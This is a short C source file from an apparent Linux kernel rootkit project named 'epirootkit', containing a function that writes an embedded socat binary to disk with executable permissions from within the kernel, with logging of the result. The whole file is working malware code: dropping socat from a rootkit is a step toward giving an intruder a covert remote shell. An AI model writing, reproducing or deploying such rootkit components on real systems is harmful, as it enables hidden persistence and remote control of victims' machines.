#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/file.h>
#include <linux/err.h>
#include "socat.h"
#include "epirootkit.h"

int drop_socat_binaire(void){
    struct file *f;
    loff_t pos = 0;

    f = filp_open(SOCAT_BINARY_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (IS_ERR(f)) {
        pr_err("epirootkit: drop_socat_binaire: failed to open file: %ld\n", PTR_ERR(f));
        return -FAILURE;
    }

    ssize_t written = kernel_write(f, socat, socat_len, &pos);
    if (written < 0) {
        pr_err("epirootkit: drop_socat_binaire: kernel_write failed: %zd\n", written);
    } else {
        pr_info("epirootkit: socat written successfully (%zd bytes)\n", written);
    }

    filp_close(f, NULL);

	return SUCCESS;
}
